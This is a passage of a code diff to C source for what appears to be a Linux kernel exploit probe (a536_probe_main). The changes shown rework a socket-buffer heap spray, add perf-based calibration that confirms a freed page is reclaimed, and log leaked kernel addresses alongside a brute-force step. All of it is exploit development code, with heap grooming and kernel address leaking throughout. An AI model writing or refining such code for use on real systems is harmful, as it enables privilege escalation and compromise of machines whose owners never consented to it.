                                     if (group_fds[i] >= 0)
@@ -2578,8 +2866,7 @@ int a536_probe_main(void)
                             printf("PAGE_LEAK_NO_PERF_DRAIN_CPU cpu=%d\n",
                                    sched_getcpu());
                             if (!drain_no_perf_group(group_fds,
-                                                     objs_per_slab,
-                                                     group_base)) {
+                                                     objs_per_slab)) {
                                 for (size_t i = 0; i < objs_per_slab; ++i)
                                     if (group_fds[i] >= 0)
                                         check_int(close(group_fds[i]),
@@ -2588,6 +2875,24 @@ int a536_probe_main(void)
                                 return 4;
                             }
                             free(group_fds);
+                            if (group_calibrate && perf_ready) {
+                                perf_capture_stop(&perf);
+                                group_free_confirmed =
+                                    perf_candidate_page_free_match(&perf,
+                                                                   base);
+                                printf("PAGE_CALIBRATION_GROUP_PAGE_FREE confirmed=%d\n",
+                                       group_free_confirmed);
+                                if (!group_free_confirmed) {
+                                    fprintf(stderr,
+                                            "PAGE_CALIBRATION_REJECT candidate_not_page_free\n");
+                                    return 4;
+                                }
+                                perf_ready = perf_capture_start(&perf);
+                                if (!perf_ready)
+                                    return 5;
+                                printf("PAGE_CALIBRATION_SKB_ALLOC_START base=0x%016zx order=%d\n",
+                                       base, SKB_RECLAIM_ORDER);
+                            }
                             if (getenv("PAGE_LEAK_NO_PERF_GROUP_DRAIN_DRY"))
                                 return 0;
                         } else if (getenv("PAGE_LEAK_NO_PERF_TARGET_ALLOC") &&
@@ -2641,21 +2946,11 @@ int a536_probe_main(void)
                        base);
             }
             wait_before_skb();
-            send_blob(skb_sv[0], blob);
             {
-                unsigned long extra_sends =
+                unsigned long requested_sends =
                     env_ulong("PAGE_LEAK_SKB_RECLAIM_SENDS", 1);
-                if (extra_sends < 1)
-                    extra_sends = 1;
-                for (unsigned long i = 1; i < extra_sends; ++i) {
-                    ssize_t sent = send_blob_flags(
-                        skb_sv[0], blob, MSG_DONTWAIT);
-                    printf("PAGE_LEAK_SKB_SEND index=%lu/%lu ret=%zd errno=%d\n",
-                           i + 1, extra_sends, sent, errno);
-                    if (sent != SKB_SEND_SIZE)
-                        break;
-                }
-                printf("PAGE_LEAK_SKB_SENT sends=%lu\n", extra_sends);
+                if (!send_blob_spray(skb_sv[0], blob, requested_sends))
+                    return 4;
             }
             if (defer_bruteforce && !brute_before_skb) {
                 kernelsnitch_bruteforce(ks);
@@ -2672,14 +2967,11 @@ int a536_probe_main(void)
             }
             if (perf_ready && (perf_defer_stop || defer_bruteforce)) {
                 int alloc_confirmed;
-                int free_confirmed = 1;
+                int free_confirmed = group_free_confirmed;
 
                 perf_capture_stop(&perf);
                 if (getenv("PAGE_LEAK_PERF_TRIGGER_SUMMARY"))
                     perf_trigger_summary(&perf);
-                if (group_calibrate)
-                    free_confirmed = perf_candidate_page_free_match(
-                        &perf, base);
                 alloc_confirmed = perf_candidate_match(&perf, leaked, base) &&
                     (!skb_reclaim || perf_candidate_alloc_match(&perf, base));
                 if (group_calibrate)
@@ -2695,7 +2987,8 @@ int a536_probe_main(void)
                     printf("PAGE_CALIBRATION_SKB_ACCEPT alloc_confirmed=1\n");
                 }
             }
-            printf("PAGE_LEAK_SKB_RECLAIM_DONE base=0x%016zx\n", base);
+            printf("PAGE_LEAK_SKB_SPRAY_DONE base=0x%016zx verification=none t_ms=%" PRIu64 "\n",
+                   base, elapsed_ms());
             if (defer_bruteforce) {
                 kernelsnitch_cleanup(ks);
                 ks = NULL;
@@ -2703,8 +2996,10 @@ int a536_probe_main(void)
         }
         for (int i = 0; i < 4; ++i)
             sched_yield();
-        printf("PAGE_LEAK_FREE_OK mm=0x%016zx base=0x%016zx\n",
-               leaked, base);
+        printf("PAGE_LEAK_TARGET_READY initial_mm=0x%016zx selected_base=0x%016zx selected_zone=%s t_ms=%" PRIu64 "\n",
+               leaked, base,
+               controlled_mm_zone_name(controlled_mm_zone(base)),
+               elapsed_ms());
         fflush(stdout);
         hold_probe();
         if (skb_reclaim) {
@@ -2774,18 +3069,9 @@ int a536_probe_main(void)
             }
         }
     }
-    send_blob(skb_sv[0], blob);
     unsigned long extra_sends = env_ulong("PAGE_LEAK_SKB_RECLAIM_SENDS", 1);
-    if (extra_sends < 1)
-        extra_sends = 1;
-    for (unsigned long i = 1; i < extra_sends; ++i) {
-        ssize_t sent = send_blob_flags(skb_sv[0], blob, MSG_DONTWAIT);
-        printf("PAGE_LEAK_SKB_SEND index=%lu/%lu ret=%zd errno=%d\n",
-               i + 1, extra_sends, sent, errno);
-        if (sent != SKB_SEND_SIZE)
-            break;
-    }
-    printf("PAGE_LEAK_SKB_SENT sends=%lu\n", extra_sends);
+    if (!send_blob_spray(skb_sv[0], blob, extra_sends))
+        return 4;
     printf("PAGE_LEAK_OK mm=0x%016zx base=0x%016zx payload=0x%016zx marker=0x%016zx\n",
            leaked, base, payload, base);
     printf("PAGE_LEAK_MARKER base=0x%016zx offset=0 len=14 text=RMG-CLEAN-PAGE\n",
